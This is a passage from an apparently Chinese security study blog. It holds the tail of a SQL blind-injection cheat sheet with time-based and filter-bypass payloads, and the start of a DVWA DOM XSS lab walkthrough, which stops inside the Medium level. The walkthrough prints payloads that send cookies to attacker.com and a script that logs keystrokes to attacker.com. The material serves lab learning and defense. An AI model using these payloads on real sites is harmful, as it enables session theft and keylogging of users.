<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- MySQL</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND SLEEP(5) --</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> IF(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>, SLEEP(<span class="number">5</span>), <span class="number">0</span>) <span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND IF((SELECT SUBSTRING(database(),1,1))=&#x27;</span>d<span class="string">&#x27;, SLEEP(5), 0) --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 基于BENCHMARK</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> BENCHMARK(<span class="number">5000000</span>, MD5(<span class="string">&#x27;test&#x27;</span>)) <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- PostgreSQL</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND pg_sleep(5) --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- SQL Server</span></span><br><span class="line"><span class="string">1&#x27;</span>; WAITFOR DELAY <span class="string">&#x27;00:00:05&#x27;</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 大小写混淆</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AnD 1=1 --</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">aNd</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 内联注释</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND/**/1=1 --</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="comment">/*comment*/</span><span class="keyword">AND</span><span class="comment">/*comment*/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 编码绕过</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND 0x31=0x31 --</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="type">CHAR</span>(<span class="number">49</span>)<span class="operator">=</span><span class="type">CHAR</span>(<span class="number">49</span>) <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="实战建议"><a href="#实战建议" class="headerlink" title="实战建议"></a>实战建议</h2><p><strong>盲注攻击步骤：</strong></p>
<ol>
<li>确认注入点（测试True&#x2F;False）</li>
<li>确定数据库类型和版本</li>
<li>枚举数据库名和表名</li>
<li>枚举列名</li>
<li>逐字符提取数据</li>
<li>破解密码哈希</li>
</ol>
<p><strong>自动化工具：</strong></p>
<ul>
<li><strong>SQLMap</strong> - 全自动SQL注入工具</li>
<li><strong>NoSQLMap</strong> - NoSQL盲注工具</li>
<li><strong>Burp Suite</strong> - 手动测试和自动化</li>
</ul>
<p><strong>防御检查：</strong></p>
<ul>
<li>✅ 所有查询使用预编译</li>
<li>✅ 输入验证（白名单）</li>
<li>✅ 最小权限</li>
<li>✅ 限流机制</li>
<li>✅ 错误不泄露信息</li>
<li>✅ 定期安全审计</li>
</ul>
<p><strong>道德准则：</strong></p>
<ul>
<li>只在授权环境测试</li>
<li>不窃取真实数据</li>
<li>学习是为了构建安全系统</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en,zh-CN,default">
    <link itemprop="mainEntityOfPage" href="http://caixuya.github.io/2025/11/20/XSS_DOM_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="caixuya">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="tia的学习笔记">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/20/XSS_DOM_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">DVWA - XSS (DOM) 攻防练习详解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-11-20 23:31:37 / Modified: 23:26:22" itemprop="dateCreated datePublished" datetime="2025-11-20T23:31:37+08:00">2025-11-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/dvwa%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">dvwa靶场学习笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>14 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li>
<li><a href="#low-%E9%9A%BE%E5%BA%A6">Low 难度</a></li>
<li><a href="#medium-%E9%9A%BE%E5%BA%A6">Medium 难度</a></li>
<li><a href="#high-%E9%9A%BE%E5%BA%A6">High 难度</a></li>
<li><a href="#impossible-%E9%9A%BE%E5%BA%A6">Impossible 难度</a></li>
<li><a href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE">防御建议</a></li>
</ul>
<hr>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="什么是DOM型XSS（DOM-based-Cross-Site-Scripting）？"><a href="#什么是DOM型XSS（DOM-based-Cross-Site-Scripting）？" class="headerlink" title="什么是DOM型XSS（DOM-based Cross-Site Scripting）？"></a>什么是DOM型XSS（DOM-based Cross-Site Scripting）？</h3><p>DOM型XSS是一种特殊的XSS攻击，攻击代码的执行完全发生在客户端（浏览器），不经过服务器处理。漏洞存在于页面的JavaScript代码中，通过不安全的DOM操作导致恶意脚本执行。</p>
<p><strong>与其他XSS的区别：</strong></p>
<table>
<thead>
<tr>
<th>特性</th>
<th>反射型XSS</th>
<th>存储型XSS</th>
<th>DOM型XSS</th>
</tr>
</thead>
<tbody><tr>
<td>数据流向</td>
<td>客户端→服务器→客户端</td>
<td>客户端→服务器→数据库→客户端</td>
<td>客户端→客户端</td>
</tr>
<tr>
<td>服务器参与</td>
<td>✓</td>
<td>✓</td>
<td>✗</td>
</tr>
<tr>
<td>持久化</td>
<td>✗</td>
<td>✓</td>
<td>✗</td>
</tr>
<tr>
<td>检测难度</td>
<td>中</td>
<td>中</td>
<td>高</td>
</tr>
</tbody></table>
<p><strong>DOM型XSS的特点：</strong></p>
<ul>
<li>攻击载荷在URL的Fragment（#后面）中</li>
<li>不会发送到服务器</li>
<li>JavaScript直接读取并处理</li>
<li>服务器日志无法记录</li>
<li>WAF难以检测</li>
</ul>
<p><strong>攻击流程：</strong></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 用户访问：http://example.com/#<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span>alert(1)<span class="language-xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="bullet">2.</span> 浏览器加载页面</span><br><span class="line"><span class="bullet">3.</span> JavaScript读取location.hash</span><br><span class="line"><span class="bullet">4.</span> 不安全的DOM操作（如innerHTML）</span><br><span class="line"><span class="bullet">5.</span> 恶意脚本执行</span><br></pre></td></tr></table></figure>

<p><strong>危害：</strong></p>
<ul>
<li>窃取Cookie和Session</li>
<li>键盘记录</li>
<li>页面劫持</li>
<li>钓鱼攻击</li>
<li>蠕虫传播</li>
</ul>
<p><strong>常见的危险Sources（输入源）：</strong></p>
<ul>
<li><code>location.hash</code></li>
<li><code>location.search</code></li>
<li><code>location.href</code></li>
<li><code>document.URL</code></li>
<li><code>document.referrer</code></li>
<li><code>window.name</code></li>
</ul>
<p><strong>常见的危险Sinks（输出点）：</strong></p>
<ul>
<li><code>innerHTML</code></li>
<li><code>outerHTML</code></li>
<li><code>document.write()</code></li>
<li><code>document.writeln()</code></li>
<li><code>eval()</code></li>
<li><code>setTimeout()</code> / <code>setInterval()</code></li>
<li><code>element.setAttribute()</code></li>
</ul>
<hr>
<h2 id="Low-难度"><a href="#Low-难度" class="headerlink" title="Low 难度"></a>Low 难度</h2><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>直接使用<code>document.write()</code>输出用户输入，完全不过滤。</p>
<h3 id="前端代码分析"><a href="#前端代码分析" class="headerlink" title="前端代码分析"></a>前端代码分析</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS (DOM)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 选择语言的下拉菜单 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;XSS&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;English&quot;</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;French&quot;</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;Spanish&quot;</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;German&quot;</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Select&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// ★★★ 核心漏洞：不安全的DOM操作 ★★★</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 检查URL中是否有default参数</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// document.location.href - 获取完整URL</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// indexOf() - 查找字符串位置</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 例如：http://example.com/?default=English</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// ★★★ 危险操作1：从URL中提取参数 ★★★</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// document.location.href.substring() - 提取子字符串</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// indexOf(&quot;default=&quot;) + 8 - 从&quot;default=&quot;后开始</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 结果：提取default参数的值</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 问题：没有任何验证或编码！</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 攻击者可以在URL中注入任意内容</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> langDefault = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) + <span class="number">8</span></span></span><br><span class="line"><span class="language-javascript">    );</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// ★★★ 危险操作2：使用document.write()直接输出 ★★★</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// document.write() - 向文档写入内容</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 作用：在页面中动态插入HTML</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 问题：</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 1. 不对langDefault进行任何编码</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 2. 如果langDefault包含HTML标签，会被浏览器解析执行</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 3. 如果包含&lt;script&gt;，脚本会立即执行</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 例如：</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// URL: ?default=&lt;script&gt;alert(1)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    // 输出：<span class="tag">&lt;<span class="name">option</span>&gt;</span>Welcome to <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    // 结果：alert(1)执行</span><br><span class="line">    document.write(&quot;<span class="tag">&lt;<span class="name">option</span>&gt;</span>Welcome to &quot; + langDefault + &quot;<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span><br><span class="line"></span><br><span class="line">    // ★★★ 另一个危险操作：选中对应的选项 ★★★</span><br><span class="line">    // document.forms[0].default.value - 访问表单的default字段</span><br><span class="line">    // 这里也没有验证langDefault，可能导致额外问题</span><br><span class="line">    document.forms[0].default.value = langDefault;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>数据流向：</strong></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">URL</span><span class="params">(?default=...)</span></span></span><br><span class="line">    ↓</span><br><span class="line">document<span class="selector-class">.location</span><span class="selector-class">.href</span> (JavaScript读取)</span><br><span class="line">    ↓</span><br><span class="line"><span class="function"><span class="title">substring</span><span class="params">()</span></span>提取参数值</span><br><span class="line">    ↓</span><br><span class="line">document<span class="selector-class">.write</span>()直接输出 ← 危险！</span><br><span class="line">    ↓</span><br><span class="line">浏览器解析并执行</span><br></pre></td></tr></table></figure>

<p><strong>核心问题：</strong></p>
<ol>
<li><strong>直接读取URL参数</strong> - 不经过服务器验证</li>
<li><strong>无任何编码</strong> - 特殊字符不转义</li>
<li><strong>使用document.write()</strong> - 直接写入HTML</li>
<li><strong>Source→Sink直接连接</strong> - 输入源直达输出点</li>
</ol>
<p><strong>为什么服务器日志看不到？</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">攻击URL: http:<span class="regexp">//</span>dvwa.local<span class="regexp">/?default=&lt;script&gt;alert(1)&lt;/</span>script&gt;<span class="comment">#fragment</span></span><br><span class="line"></span><br><span class="line">发送到服务器: http:<span class="regexp">//</span>dvwa.local<span class="regexp">/?default=&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br><span class="line">Fragment部分(<span class="comment">#): 不发送到服务器</span></span><br><span class="line"></span><br><span class="line">或者使用Fragment攻击:</span><br><span class="line">http:<span class="regexp">//</span>dvwa.local<span class="regexp">/#default=&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br><span class="line">发送到服务器: http:<span class="regexp">//</span>dvwa.local/ (只有域名)</span><br></pre></td></tr></table></figure>

<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="步骤1：基础测试"><a href="#步骤1：基础测试" class="headerlink" title="步骤1：基础测试"></a>步骤1：基础测试</h4><p><strong>测试1：正常功能</strong></p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">URL:</span> ?<span class="keyword">default</span>=English</span><br><span class="line">结果: &lt;<span class="keyword">option</span>&gt;Welcome <span class="keyword">to</span> English&lt;/<span class="keyword">option</span>&gt;</span><br></pre></td></tr></table></figure>

<p><strong>测试2：简单XSS</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">URL</span>: ?<span class="keyword">default</span>=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">结果: 弹出<span class="variable constant_">XSS</span>对话框</span><br></pre></td></tr></table></figure>

<h4 id="步骤2：窃取Cookie"><a href="#步骤2：窃取Cookie" class="headerlink" title="步骤2：窃取Cookie"></a>步骤2：窃取Cookie</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- URL编码前 --&gt;</span></span><br><span class="line">?default=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&#x27;http://attacker.com/steal.php?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- URL编码后 --&gt;</span></span><br><span class="line">?default=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fattacker.com%2Fsteal.php%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E</span><br></pre></td></tr></table></figure>

<h4 id="步骤3：使用图片标签"><a href="#步骤3：使用图片标签" class="headerlink" title="步骤3：使用图片标签"></a>步骤3：使用图片标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 更隐蔽的方式 --&gt;</span></span><br><span class="line">?default=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 窃取Cookie --&gt;</span></span><br><span class="line">?default=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;this.src=&#x27;http://attacker.com/?c=&#x27;+document.cookie&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤4：无标签攻击"><a href="#步骤4：无标签攻击" class="headerlink" title="步骤4：无标签攻击"></a>步骤4：无<script>标签攻击</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 使用事件处理器 --&gt;</span></span><br><span class="line">?default=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">?default=<span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">?default=<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line">?default=<span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤5：使用Fragment（-）"><a href="#步骤5：使用Fragment（-）" class="headerlink" title="步骤5：使用Fragment（#）"></a>步骤5：使用Fragment（#）</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Fragment不会发送到服务器，WAF无法检测 --&gt;</span></span><br><span class="line">http://dvwa.local/#default=<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 需要修改JavaScript读取逻辑 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 如果代码读取location.hash而不是search --&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤6：键盘记录器"><a href="#步骤6：键盘记录器" class="headerlink" title="步骤6：键盘记录器"></a>步骤6：键盘记录器</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?default=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">onkeypress</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;http://attacker.com/log.php&#x27;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">send</span>(<span class="string">&#x27;key=&#x27;</span> + <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(e.<span class="property">which</span>));</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Medium-难度"><a href="#Medium-难度" class="headerlink" title="Medium 难度"></a>Medium 难度</h2><h3 id="攻击目标-1"><a href="#攻击目标-1" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>添加了部分过滤，但可以绕过。</p>
<h3 id="前端代码分析-1"><a href="#前端代码分析-1" class="headerlink" title="前端代码分析"></a>前端代码分析</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 检查URL参数</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 提取参数值</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> langDefault = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) + <span class="number">8</span></span></span><br><span class="line"><span class="language-javascript">    );</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// ★★★ 新增：过滤&lt;script&gt;标签 ★★★</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 使用正则表达式替换&lt;script&gt;标签</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// /&lt;script[^&gt;]*&gt;.*?&lt;\/script&gt;/gi</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 分解：</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// &lt;script[^&gt;]*&gt; - 匹配&lt;script&gt;开始标签（包含属性）</span></span></span><br><span 